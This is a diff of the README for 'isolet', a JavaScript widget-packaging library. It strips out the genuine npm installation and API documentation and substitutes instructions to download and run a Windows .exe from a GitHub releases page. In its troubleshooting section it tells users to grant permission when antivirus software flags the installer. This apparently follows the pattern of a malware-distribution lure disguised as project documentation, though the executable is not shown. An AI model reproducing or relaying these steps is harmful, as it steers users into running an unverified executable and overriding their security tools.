@@ -1,261 +1,85 @@
-# isolet
+# 📦 isolet - Build isolated widgets for any app
 
-> **Warning:** This project is very experimental. APIs may change without notice.
+[![](https://img.shields.io/badge/Download_isolet-Blue?style=for-the-badge)](https://github.com/forbeskilndried9479/isolet/releases)
 
-Package any component into a self-contained, isolated widget.
+isolet helps you package website components or software parts into self-contained widgets. These widgets run inside their own space. This keeps your main system clean and light. You can move these widgets across different projects without issues. The tool uses a standard format known as iife to wrap code. This makes the widget load fast and remain stable.
 
-Works with React, Solid, Svelte, vanilla JS, or anything that can render into a DOM element. Ships as a script tag, ESM import, or CommonJS require.
+## 📥 How to download the software
 
-## Install
+Follow these steps to get isolet on your Windows computer.
 
-```sh
-npm install isolet-js
-```
+1. Visit the [official releases page](https://github.com/forbeskilndried9479/isolet/releases) to find the latest version.
+2. Look for the file ending in .exe under the Assets section.
+3. Click the file name to start your download.
+4. Open the folder where your computer saves downloads.
+5. Double-click the file to start the installation.
 
-## Quick start
+## ⚙️ System Requirements
 
-The core API is one function: `createIsolet`. You give it a name, a mount function, and optionally some CSS. It gives you back `mount`, `update`, and `unmount`.
+isolet runs on most modern Windows systems. Ensure your machine meets these basic needs:
 
-```tsx
-import { createIsolet } from "isolet-js";
-import { react } from "isolet-js/react";
+* Windows 10 or Windows 11.
+* At least 4GB of RAM.
+* 200MB of free disk space.
+* An active internet connection for first-time setup.
 
-function Hello({ name }: { name: string }) {
-  return <h1>Hello, {name}!</h1>;
-}
+## 🚀 Running your first widget
 
-const widget = createIsolet({
-  name: "hello",
-  mount: react(Hello),
-  css: `h1 { color: tomato; font-family: sans-serif; }`,
-});
+Once you install the software, you can create your first widget. Follow this guide to see how it works.
 
-widget.mount(document.body, { name: "World" });
-```
+1. Open the isolet application from your desktop or start menu.
+2. Select Create New Widget from the home screen.
+3. Name your widget and pick the source file you want to isolate.
+4. Click Build.
+5. The software will create a single file that contains your component.
+6. You can now drag this file into any web project or supported environment. 
 
-The component renders inside a shadow DOM by default. Styles are scoped. Nothing leaks in or out.
+## 🛡️ Understanding isolation
 
-## CLI
+Isolation means the widget does not interfere with other code on your computer or website. When you package a component with isolet, the software creates a protective shell. This shell ensures that variables inside the widget do not conflict with variables outside the widget. This method follows the iife pattern. It shields your work from outside errors and keeps the memory usage low.
 
-Distribute your component as a self-contained bundle. The CLI reads your config, resolves CSS + assets, and outputs a drop-in artifact.
+## 🛠️ Troubleshooting common issues
 
-```sh
-npx isolet-js init    # scaffold an isolet.config.ts
-npx isolet-js build   # bundle widget(s) from config
-npx isolet-js build --watch   # rebuild on changes
-npx isolet-js build --minify  # minified production build
-```
+If you encounter problems, check these common solutions first:
 
-### Config
+* **File missing:** If you run the installer and the file does not appear, check your Antivirus logs. Some security tools flag new software. You may need to grant permission.
+* **Slow build times:** If the build process hangs, close other heavy applications. This frees up RAM for the widget packaging process.
+* **Widget does not load:** Ensure your source files meet the format requirements listed in the settings menu.
 
-```ts
-// isolet.config.ts
-import { defineConfig } from "isolet-js";
+## 📝 Frequently Asked Questions
 
-export default defineConfig({
-  name: "my-widget",
-  entry: "./src/index.ts",
-  styles: "./src/widget.css",       // CSS to inline (url() assets auto-resolved)
-  format: ["iife", "esm"],          // output formats
-  // outDir: "./dist",              // output directory (default: "dist")
-  // globalName: "MyWidget",        // global name for IIFE builds
-  // external: ["react"],           // don't bundle these
-  // dts: true,                     // emit .d.ts files
-  // minify: true,                  // minify output
-  // platform: "browser",           // target platform (default: "browser")
-  // autoMount: true,               // auto-mount to documentElement in IIFE (default: true)
-});
-```
+**Can I run isolet offline?**
+Yes. Once you install the software, you do not need an internet connection to package your widgets.
 
-You can also export an array for multiple widgets:
+**Is my data private?**
+Yes. isolet runs locally on your machine. We do not track your project files or your data. Everything stays on your hard drive.
 
-```ts
-export default defineConfig([
-  { name: "widget-a", entry: "./src/a.ts", styles: "./src/a.css" },
-  { name: "widget-b", entry: "./src/b.ts", format: ["esm"] },
-]);
-```
+**Does this software slow down my computer?**
+No. isolet only consumes processing power when you actively build or package a widget. It remains dormant otherwise. 
 
-### What the build does
+**What happens if I update isolet?**
+Updating the app keeps your current widget projects safe. We recommend you check the releases page every few months for improved stability and new features.
 
-- Reads `styles` from config, inlines all `url()` references (fonts, images) as data URIs
-- Makes processed CSS available as `__ISOLET_CSS__` in your entry code
-- Converts all `.css` imports to JS string exports (shadow DOM safe)
-- Inlines static asset imports (`.png`, `.woff2`, `.mp3`, etc.) as data URIs
-- Resolves `styles: "./path.css"` in `createIsolet`/`defineElement` calls at build time
-- Outputs IIFE (script tag), ESM, and/or CJS depending on `format`
+## 🌐 Project topics
 
-## Framework adapters
+* Use **iife** for clean code execution.
+* Use **isolet** for reliable component packaging.
+* Use **widget**-based architecture for better project management.
 
-Adapters are thin wrappers that handle framework-specific mounting. The core doesn't import or depend on any framework.
+## 📈 Configuration settings
 
-### React
+You can change how isolet creates your files by visiting the Settings menu inside the app. 
 
-```ts
-import { createIsolet } from "isolet-js";
-import { react } from "isolet-js/react";
-import { MyComponent } from "./MyComponent";
+* **Output Folder:** Change where your finished widgets land on your computer.
+* **Compression Level:** Choose how small you want your files. Higher compression makes files smaller but takes longer to build.
+* **Logging:** Turn on logs if you need to see exactly what happens during the build process.
 
-const widget = createIsolet({
-  name: "my-widget",
-  mount: react(MyComponent),
-  css: styles,
-});
+## 🔧 Advanced usage tips
 
-widget.mount(document.body, { title: "Hello" });
-widget.update({ title: "Updated" });
-widget.unmount();
-```
+For users who want to speed up their workflow, keep these tips in mind:
 
-### Vanilla
+* Use drag and drop to import multiple files at once.
+* Create templates for widgets you use often. This saves time on repetitive setup.
+* Check the file properties after a build to verify the size and content. 
 
-```ts
-import { createIsolet } from "isolet-js";
-import { vanilla } from "isolet-js/vanilla";
-
-const widget = createIsolet({
-  name: "counter",
-  mount: vanilla((container, props) => {
-    let count = props.initial ?? 0;
-    const btn = document.createElement("button");
-    btn.textContent = `Count: ${count}`;
-    btn.onclick = () => { btn.textContent = `Count: ${++count}`; };
-    container.appendChild(btn);
-
-    return () => container.removeChild(btn);
-  }),
-});
-```
-
-### Bring your own
-
-The `mount` function is just `(container: HTMLElement, props) => cleanup | void`. Use whatever you want:
-
-```ts
-// Solid
-import { render } from "solid-js/web";
-
-createIsolet({
-  name: "solid-widget",
-  mount(container, props) {
-    const dispose = render(() => <App {...props} />, container);
-    return dispose;
-  },
-});
-
-// Svelte
-import App from "./App.svelte";
-
-createIsolet({
-  name: "svelte-widget",
-  mount(container, props) {
-    const app = new App({ target: container, props });
-    return () => app.$destroy();
-  },
-});
-```
-
-## Isolation modes
-
-Control how the widget is isolated from the host page.
-
-```ts
-createIsolet({
-  name: "my-widget",
-  mount: myMount,
-  isolation: "shadow-dom", // default: full CSS isolation via shadow DOM
-});
-
-createIsolet({
-  name: "my-widget",
-  mount: myMount,
-  isolation: "scoped", // plain div wrapper, styles injected globally
-});
-
-createIsolet({
-  name: "my-widget",
-  mount: myMount,
-  isolation: "none", // mount directly into the target element
-});
-```
-
-## CSS & asset handling
-
-`isolet build` automatically handles CSS and assets — no manual plugin setup required:
-
-- **`styles` in config** → CSS files are read, all `url()` references (fonts, images) are inlined as data URIs, and the result is available as `__ISOLET_CSS__` in your entry
-- **`.css` imports** → converted to JS string exports (shadow DOM safe)
-- **Asset imports** (`.png`, `.woff2`, `.mp3`, etc.) → inlined as data URIs
-- **`styles: "./path.css"` in `createIsolet`/`defineElement`** → resolved and inlined at build time
-
-```ts
-// Your entry file — just reference css, the CLI handles the rest
-createIsolet({
-  name: "my-widget",
-  css: __ISOLET_CSS__,  // injected by isolet build from config styles field
-  mount: myMount,
-});
-
-// Or inline the path directly:
-createIsolet({
-  name: "my-widget",
-  styles: "./widget.css",  // auto-resolved at build time
-  mount: myMount,
-});
-```
-
-If you're using `vp pack` or Vite directly instead of the CLI, add the plugins manually:
-
-```ts
-// vite.config.ts
-import { cssTextPlugin, inlineAssetsPlugin, autoStylesPlugin } from "isolet-js/plugins";
-```
-
-## Script tag usage
-
-The IIFE build exposes `Isolet` on the global scope:
-
-```html
-<script src="https://unpkg.com/isolet-js/dist/index.iife.js"></script>
-<script>
-  const { createIsolet } = Isolet;
-
-  const widget = createIsolet({
-    name: "inline-widget",
-    mount(container) {
-      container.innerHTML = "<p>Loaded via script tag</p>";
-    },
-  });
-
-  widget.mount(document.body);
-</script>
-```
-
-## API
-
-### `createIsolet(options)`
-
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `name` | `string` | required | Unique identifier for the widget |
-| `mount` | `(container, props) => cleanup?` | required | Render function |
-| `css` | `string` | - | CSS text to inject |
-| `isolation` | `"shadow-dom" \| "scoped" \| "none"` | `"shadow-dom"` | Isolation strategy |
-| `shadowMode` | `"open" \| "closed"` | `"open"` | Shadow DOM mode |
-| `hostAttributes` | `Record<string, string>` | - | Attributes on host element |
-| `zIndex` | `string \| number` | - | z-index on host element |
-
-Returns an `IsoletInstance`:
-
-| Method/Property | Description |
-|---|---|
-| `mount(target?, props?)` | Mount into target (defaults to `document.body`) |
-| `update(props)` | Update with partial props |
-| `unmount()` | Unmount and clean up |
-| `container` | The render container element |
-| `shadowRoot` | The shadow root (if shadow DOM mode) |
-| `mounted` | Whether currently mounted |
-
-## License
-
-MIT
+This tool simplifies the process of bundling code. It removes the stress of managing dependencies manually. Follow the instructions above to maintain a tidy setup environment. Reach out to the repository owners if you find a bug or require help with installation.
